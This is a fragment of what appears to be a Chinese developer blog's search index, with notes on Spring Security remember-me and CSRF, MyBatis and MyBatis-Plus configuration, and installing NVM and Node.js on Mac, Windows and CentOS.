class="hljs-title function_">persistentTokenRepository</span><span class="hljs-params">()</span> &#123;        <span class="hljs-type">JdbcTokenRepositoryImpl</span> <span class="hljs-variable">jdbcTokenRepository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTokenRepositoryImpl</span>();        jdbcTokenRepository.setDataSource(dataSource);        <span class="hljs-comment">// 自动生成表,这样就不用自己创建表类</span>        jdbcTokenRepository.setCreateTableOnStartup(<span class="hljs-literal">true</span>);        <span class="hljs-keyword">return</span> jdbcTokenRepository;    &#125;language-java复制代码</code></pre><ol><li>配置类中，配置自动登录</li></ol><pre><code class="hljs java">.and().rememberMe().tokenRepository(persistentTokenRepository())                    <span class="hljs-comment">// 设置有效时长</span>                    .tokenValiditySeconds(<span class="hljs-number">60</span>)                    <span class="hljs-comment">// 使用userDetailsService对象对数据库的操作</span>                    .userDetailsService(userDetailsService)language-java复制代码</code></pre><ol><li>在登录页面添加复选框</li></ol><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;remember-me&quot;</span>&gt;</span>自动登录<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>language-html复制代码</code></pre><h3 id="第九章-CSRF"><a href="#第九章-CSRF" class="headerlink" title="第九章 CSRF"></a>第九章 CSRF</h3><h4 id="9-1"><a href="#9-1" class="headerlink" title="9.1"></a>9.1</h4><pre><code class="hljs java">&lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> th:name=<span class="hljs-string">&quot;$&#123;_csrf.parameterName&#125;&quot;</span> th:value=<span class="hljs-string">&quot;$&#123;_csrf.token&#125;&quot;</span>/&gt;language-java复制代码</code></pre><h4 id="9-2-开启CSRF-防护"><a href="#9-2-开启CSRF-防护" class="headerlink" title="9.2 开启CSRF 防护"></a>9.2 开启CSRF 防护</h4><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis</title>
      <link href="/2021/07/13/Mybatis/"/>
      <url>/2021/07/13/Mybatis/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis配置代码"><a href="#Mybatis配置代码" class="headerlink" title="Mybatis配置代码"></a>Mybatis配置代码</h1><h2 id="1-Log4j的配置"><a href="#1-Log4j的配置" class="headerlink" title="1. Log4j的配置"></a>1. Log4j的配置</h2><h3 id="步骤1-导入包"><a href="#步骤1-导入包" class="headerlink" title="步骤1 导入包"></a>步骤1 导入包</h3><pre><code class="hljs pom">&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;&lt;dependency&gt;    &lt;groupId&gt;log4j&lt;/groupId&gt;    &lt;artifactId&gt;log4j&lt;/artifactId&gt;    &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt;language-pom复制代码</code></pre><hr><h3 id="步骤2-log4j-properties"><a href="#步骤2-log4j-properties" class="headerlink" title="步骤2 log4j.properties"></a>步骤2 log4j.properties</h3><pre><code class="hljs properties"><span class="hljs-comment">#将等级为DEBUG的日志信息输出到console和file两个目的地</span><span class="hljs-attr">log4j.rootLogger</span>=<span class="hljs-string">DEBUG,console,file</span><span class="hljs-comment"></span><span class="hljs-comment">#控制台输出的相关设置</span><span class="hljs-attr">log4j.appender.console</span>=<span class="hljs-string">org.apache.log4j.ConsoleAppender</span><span class="hljs-attr">log4j.appender.console.Target</span>=<span class="hljs-string">System.out</span><span class="hljs-attr">log4j.appender.console.Threshold</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.appender.console.layout</span>=<span class="hljs-string">org.apache.log4j.PatternLayout</span><span class="hljs-attr">log4j.appender.console.layout.ConversionPattern</span>=<span class="hljs-string">【%c】-%m%n</span><span class="hljs-comment"></span><span class="hljs-comment">#文件输出的相关配置</span><span class="hljs-attr">log4j.appender.file</span>=<span class="hljs-string">org.apache.log4j.RollingFileAppender</span><span class="hljs-attr">log4j.appender.file.File</span>=<span class="hljs-string">./log/kuang.log</span><span class="hljs-attr">log4j.appender.file.MaxFileSize</span>=<span class="hljs-string">10mb</span><span class="hljs-attr">log4j.appender.file.Threshold</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.appender.file.layout</span>=<span class="hljs-string">org.apache.log4j.PatternLayout</span><span class="hljs-attr">log4j.appender.file.layout.ConversionPattern</span>=<span class="hljs-string">【%p】[%d&#123;yy-MM-dd&#125;【%c】%m%n</span><span class="hljs-comment"></span><span class="hljs-comment">#日志输出级别</span><span class="hljs-attr">log4j.logger.org.mybatis</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.Statement</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.ResultSet</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.PreparedStatement</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">language-properties复制代码</span></code></pre><hr><h3 id="步骤3-设置使用log4j"><a href="#步骤3-设置使用log4j" class="headerlink" title="步骤3 设置使用log4j"></a>步骤3 设置使用log4j</h3><h3 id="4-使用log4j"><a href="#4-使用log4j" class="headerlink" title="4 使用log4j"></a>4 使用log4j</h3><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(xx.class)logger.info(<span class="hljs-string">&quot;进入到了log4j&quot;</span>);language-java复制代码</code></pre><h2 id="1-Log4j的配置-1"><a href="#1-Log4j的配置-1" class="headerlink" title="1. Log4j的配置"></a>1. Log4j的配置</h2><h3 id="步骤1-导入包-1"><a href="#步骤1-导入包-1" class="headerlink" title="步骤1 导入包"></a>步骤1 导入包</h3><pre><code class="hljs pom">&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;&lt;dependency&gt;    &lt;groupId&gt;log4j&lt;/groupId&gt;    &lt;artifactId&gt;log4j&lt;/artifactId&gt;    &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt;language-pom复制代码</code></pre><hr><h3 id="步骤2-log4j-properties-1"><a href="#步骤2-log4j-properties-1" class="headerlink" title="步骤2 log4j.properties"></a>步骤2 log4j.properties</h3><pre><code class="hljs properties"><span class="hljs-comment">#将等级为DEBUG的日志信息输出到console和file两个目的地</span><span class="hljs-attr">log4j.rootLogger</span>=<span class="hljs-string">DEBUG,console,file</span><span class="hljs-comment"></span><span class="hljs-comment">#控制台输出的相关设置</span><span class="hljs-attr">log4j.appender.console</span>=<span class="hljs-string">org.apache.log4j.ConsoleAppender</span><span class="hljs-attr">log4j.appender.console.Target</span>=<span class="hljs-string">System.out</span><span class="hljs-attr">log4j.appender.console.Threshold</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.appender.console.layout</span>=<span class="hljs-string">org.apache.log4j.PatternLayout</span><span class="hljs-attr">log4j.appender.console.layout.ConversionPattern</span>=<span class="hljs-string">【%c】-%m%n</span><span class="hljs-comment"></span><span class="hljs-comment">#文件输出的相关配置</span><span class="hljs-attr">log4j.appender.file</span>=<span class="hljs-string">org.apache.log4j.RollingFileAppender</span><span class="hljs-attr">log4j.appender.file.File</span>=<span class="hljs-string">./log/kuang.log</span><span class="hljs-attr">log4j.appender.file.MaxFileSize</span>=<span class="hljs-string">10mb</span><span class="hljs-attr">log4j.appender.file.Threshold</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.appender.file.layout</span>=<span class="hljs-string">org.apache.log4j.PatternLayout</span><span class="hljs-attr">log4j.appender.file.layout.ConversionPattern</span>=<span class="hljs-string">【%p】[%d&#123;yy-MM-dd&#125;【%c】%m%n</span><span class="hljs-comment"></span><span class="hljs-comment">#日志输出级别</span><span class="hljs-attr">log4j.logger.org.mybatis</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.Statement</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.ResultSet</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">log4j.logger.java.sql.PreparedStatement</span>=<span class="hljs-string">DEBUG</span><span class="hljs-attr">language-properties复制代码</span></code></pre><hr><h3 id="步骤3-设置使用log4j-1"><a href="#步骤3-设置使用log4j-1" class="headerlink" title="步骤3 设置使用log4j"></a>步骤3 设置使用log4j</h3><pre><code class="hljs xml">language-xml复制代码</code></pre><p>— ###4 使用log4j</p><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(xx.class)logger.info(<span class="hljs-string">&quot;进入到了log4j&quot;</span>);language-java复制代码</code></pre><h2 id="第二章-配置模式"><a href="#第二章-配置模式" class="headerlink" title="第二章 配置模式"></a>第二章 配置模式</h2><h3 id="1-1-配置"><a href="#1-1-配置" class="headerlink" title="1.1 配置"></a>1.1 配置</h3><ol><li>application.yaml</li><li>全局配置文件</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>language-xml复制代码</code></pre><ol><li>mapper 映射文件</li></ol><pre><code class="hljs xml">language-xml复制代码</code></pre><h3 id="1-2-使用"><a href="#1-2-使用" class="headerlink" title="1.2 使用"></a>1.2 使用</h3><ol><li>定义实体类</li></ol><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fh.oa.entity;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;    <span class="hljs-keyword">private</span> Long id;    <span class="hljs-keyword">private</span> String userId;    <span class="hljs-keyword">private</span> Integer money;&#125;language-java复制代码</code></pre><ol><li>定义接口</li></ol><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fh.oa.dao;<span class="hljs-keyword">import</span> com.fh.oa.entity.Account;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AccountDao</span> &#123;    <span class="hljs-comment">// 根据 id 获取用户</span>    <span class="hljs-keyword">public</span> Account <span class="hljs-title function_">getAcct</span><span class="hljs-params">(Long id)</span>;&#125;language-java复制代码</code></pre><ol><li>mapper</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com/fh/oa/dao/AccountDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--  查询账号，根据ID  --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAcct&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com/fh/oa/entity/Account&quot;</span>&gt;</span>        select * from account_tab where id=#&#123;id&#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><hr><h2 id="第三章-MyBatis-Plus简单使用"><a href="#第三章-MyBatis-Plus简单使用" class="headerlink" title="第三章 MyBatis-Plus简单使用"></a>第三章 MyBatis-Plus简单使用</h2><h3 id="1-pom-xml"><a href="#1-pom-xml" class="headerlink" title="1. pom.xml"></a>1. pom.xml</h3><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--MyBatis Plus--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--代码生成器依赖--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--模版引擎--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.velocity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>velocity-engine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--MySql--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>language-xml复制代码</code></pre><hr><h3 id="2-自动代码生成类"><a href="#2-自动代码生成类" class="headerlink" title="2. 自动代码生成类"></a>2. 自动代码生成类</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fh.oateat;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.DataSourceConfig;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.GlobalConfig;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.PackageConfig;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.StrategyConfig;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoMapper</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">// 创建 AutoGenerator, MP中对象</span>        <span class="hljs-type">AutoGenerator</span> <span class="hljs-variable">ag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AutoGenerator</span>();        <span class="hljs-comment">// 设置全局配置</span>        <span class="hljs-type">GlobalConfig</span> <span class="hljs-variable">gc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalConfig</span>();        <span class="hljs-comment">// 设置代码的生成位置，磁盘的目录</span>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>);        gc.setOutputDir(path + <span class="hljs-string">&quot;/src/main/java&quot;</span>);        <span class="hljs-comment">// 设置生成的类的名称 （命名规则）所有的Dao类都是Mapper结尾的，例如UserMapp;</span>        gc.setMapperName(<span class="hljs-string">&quot;%sMapper&quot;</span>);        gc.setServiceName(<span class="hljs-string">&quot;%sService&quot;</span>);        gc.setServiceImplName(<span class="hljs-string">&quot;%sServiceImple&quot;</span>);        gc.setControllerName(<span class="hljs-string">&quot;%sController&quot;</span>);        <span class="hljs-comment">// 设置作者</span>        gc.setAuthor(<span class="hljs-string">&quot;hjxstart&quot;</span>);        <span class="hljs-comment">// 设置主键id 的设置，可能需要安装数据情况进行更改</span>        gc.setIdType(IdType.AUTO);        <span class="hljs-comment">// 把GlobalConfig 复制给 AutoGenerator</span>        ag.setGlobalConfig(gc);        <span class="hljs-comment">// 设置数据源 DataSource</span>        <span class="hljs-type">DataSourceConfig</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceConfig</span>();        <span class="hljs-comment">// 设置驱动</span>        ds.setDriverName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);        <span class="hljs-comment">// 设置url</span>        ds.setUrl(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/oa?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>);        <span class="hljs-comment">// 设置数据库的用户名</span>        ds.setUsername(<span class="hljs-string">&quot;root&quot;</span>);        <span class="hljs-comment">// 设置密码</span>        ds.setPassword(<span class="hljs-string">&quot;hadoop&quot;</span>);        <span class="hljs-comment">// 把 DataSourceConfig 赋值给 AutoGenerator</span>        ag.setDataSource(ds);        <span class="hljs-comment">// 设置Package信息</span>        <span class="hljs-type">PackageConfig</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageConfig</span>();        <span class="hljs-comment">// 设置模块名称，相当于包名，在这个包的下面有 mapper, service, controller</span>        pc.setModuleName(<span class="hljs-string">&quot;v1&quot;</span>);        <span class="hljs-comment">// 设置夫包名,order 就在父包的下面生成</span>        pc.setParent(<span class="hljs-string">&quot;com.fh.oateat&quot;</span>);        ag.setPackageInfo(pc);        <span class="hljs-comment">// 设置策略</span>        <span class="hljs-type">StrategyConfig</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StrategyConfig</span>();        <span class="hljs-comment">// 设置支持驼峰的命名规则</span>        sc.setNaming(NamingStrategy.underline_to_camel);        sc.setColumnNaming(NamingStrategy.underline_to_camel);        ag.setStrategy(sc);        <span class="hljs-comment">// 执行代码的生成</span>        ag.execute();    &#125;&#125;language-java复制代码</code></pre><hr><h3 id="3-Application"><a href="#3-Application" class="headerlink" title="3. Application"></a>3. Application</h3><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.fh.oateat.v1.mapper&quot;)</span> <span class="hljs-comment">// 该注解可以省略在每个mapper接口的注解</span><span class="hljs-meta">@SpringBootApplication</span>language-java复制代码</code></pre><hr><h3 id="4-application-yaml"><a href="#4-application-yaml" class="headerlink" title="4. application.yaml"></a>4. application.yaml</h3><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <span class="hljs-attr">datasource:</span>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/oa?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>    <span class="hljs-attr">password:</span> <span class="hljs-string">hadoop</span> <span class="hljs-comment"># hadoop service</span>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span><span class="hljs-attr">mybatis-plus:</span>  <span class="hljs-attr">configuration:</span>    <span class="hljs-string">//</span> <span class="hljs-string">控制台输出对数据库的操作</span>    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span><span class="hljs-string">language-yaml复制代码</span></code></pre><hr><h3 id="5-分页插件"><a href="#5-分页插件" class="headerlink" title="5. 分页插件"></a>5. 分页插件</h3><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;    <span class="hljs-comment">//分页查询 mybatis-plus</span>    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();        <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">paginationInnerInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();        paginationInnerInterceptor.setDbType(DbType.MYSQL);        paginationInnerInterceptor.setOverflow(<span class="hljs-literal">true</span>);        interceptor.addInnerInterceptor(paginationInnerInterceptor);        <span class="hljs-keyword">return</span> interceptor;    &#125;&#125;language-java复制代码</code></pre><hr><h3 id="6-创建好数据库即可"><a href="#6-创建好数据库即可" class="headerlink" title="6. 创建好数据库即可"></a>6. 创建好数据库即可</h3><ol><li>会根据数据库的表自动生成entity,mapper,service,controller</li></ol><hr><h3 id="7-Controller测试"><a href="#7-Controller测试" class="headerlink" title="7. Controller测试"></a>7. Controller测试</h3><h2 id="第二章-逻辑删除"><a href="#第二章-逻辑删除" class="headerlink" title="第二章 逻辑删除"></a>第二章 逻辑删除</h2><h3 id="1-在实体类和数据库添加enable字段"><a href="#1-在实体类和数据库添加enable字段" class="headerlink" title="1. 在实体类和数据库添加enable字段"></a>1. 在实体类和数据库添加enable字段</h3><pre><code class="hljs java"><span class="hljs-keyword">private</span> Integer enabled;language-java复制代码</code></pre><h3 id="2-添加注解，实现局部逻辑删除"><a href="#2-添加注解，实现局部逻辑删除" class="headerlink" title="2. 添加注解，实现局部逻辑删除"></a>2. 添加注解，实现局部逻辑删除</h3><pre><code class="hljs java"><span class="hljs-meta">@TableLogic</span>    <span class="hljs-keyword">private</span> Integer enabled;language-java复制代码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NVM</title>
      <link href="/2021/07/05/NVM/"/>
      <url>/2021/07/05/NVM/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文介绍在 Moc, Windows10 和 Centos7.9 环境下安装 Node 版本管理工具NVM</p></blockquote><h1 id="一、Mac"><a href="#一、Mac" class="headerlink" title="一、Mac"></a>一、Mac</h1><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><pre><code class="hljs bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash</code></pre><h2 id="1-2-配置-bashrc"><a href="#1-2-配置-bashrc" class="headerlink" title="1.2 配置 ~/.bashrc"></a>1.2 配置 <code>~/.bashrc</code></h2><pre><code class="hljs bash"><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-subst">$([ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XDG_CONFIG_HOME-&#125;</span>&quot;</span> ] &amp;&amp; printf %s <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.nvm&quot;</span> || printf %s <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XDG_CONFIG_HOME&#125;</span>/nvm&quot;</span>)</span>&quot;</span>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> <span class="hljs-comment"># This loads nvm</span></code></pre><blockquote><p>启用配置：source ~&#x2F;.bashrc</p></blockquote><h2 id="1-3-安装-Node"><a href="#1-3-安装-Node" class="headerlink" title="1.3 安装 Node"></a>1.3 安装 Node</h2><ol><li>查看远端版本</li></ol><pre><code class="hljs bash">nvm ls-remote </code></pre><ol><li>安装指定的版本</li></ol><pre><code class="hljs bash">nvm install 16.14.0</code></pre><ol><li>安装指定版本</li></ol><p>安装指定版本直接在后面加上版本号即可</p><pre><code class="hljs bash">nvm use 16.14.0</code></pre><hr><h1 id="二、Win10"><a href="#二、Win10" class="headerlink" title="二、Win10"></a>二、Win10</h1><h2 id="2-1-nvm-安装"><a href="#2-1-nvm-安装" class="headerlink" title="2.1 nvm 安装"></a>2.1 nvm 安装</h2><p>*<strong>注意：如果本地已经安装了 node，要先卸载 node 再安装 nvm*</strong></p><pre><code class="hljs bash">nvm -v // 检查nvm是否安装成功</code></pre><h2 id="2-2-使用-nvm-安装-node"><a href="#2-2-使用-nvm-安装-node" class="headerlink" title="2.2 使用 nvm 安装 node"></a>2.2 使用 nvm 安装 node</h2><ol><li>查看 nvm 的指令</li></ol><pre><code class="hljs bash">nvm -h</code></pre><ol><li>查看本地已经安装的 node 版本列表</li></ol><pre><code class="hljs bash">nvm list</code></pre><ol><li>查看可以安装的 node 版本</li></ol><pre><code class="hljs bash">nvm list available</code></pre><ol><li>安装最新版本的 node</li></ol><pre><code class="hljs bash">nvm install latest</code></pre><ol><li>安装指定版本的 node. 例如安装 10.16.0 版本</li></ol><pre><code class="hljs bash">nvm install 10.16.0</code></pre><ol><li>使用对应版本的 node</li></ol><pre><code class="hljs bash">nvm use 10.16.0</code></pre><ol><li>卸载对应版本的 node</li></ol><pre><code class="hljs bash">nvm uninstall 10.16.0</code></pre><hr><h1 id="三、Centos7-9"><a href="#三、Centos7-9" class="headerlink" title="三、Centos7.9"></a>三、Centos7.9</h1><h2 id="2-1-安装-git"><a href="#2-1-安装-git" class="headerlink" title="2.1 安装 git"></a>2.1 安装 git</h2><pre><code class="hljs bash">yum install git</code></pre><p>查看 git 版本</p><pre><code class="hljs bash">git --version</code></pre><h2 id="2-2-安装-nvm"><a href="#2-2-安装-nvm" class="headerlink" title="2.2 安装 nvm"></a>2.2 安装 nvm</h2><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git://github.com/creationix/nvm.git ~/nvm</code></pre><p>验证安装</p><pre><code class="hljs bash"><span class="hljs-built_in">command</span> -v nvm</code></pre><p>设置 nvm 自动运行</p><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/nvm/nvm.sh&quot;</span> &gt;&gt; ~/.bashrc<span class="hljs-built_in">source</span> ~/.bashrc</code></pre><p>查询 Node.js 版本</p><pre><code class="hljs bash">nvm list-remote</code></pre><p>安装 Node.js 版本</p><pre><code class="hljs bash">nvm install v16.14.0</code></pre><p>切换 Node.js 版本</p><pre><code class="hljs bash">nvm use v16.14.0</code></pre><p>升级 npm</p><pre><code class="hljs bash">npm -g</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Project</title>
      <link href="/2021/06/26/Java-Project/"/>
      <url>/2021/06/26/Java-Project/</url>
      
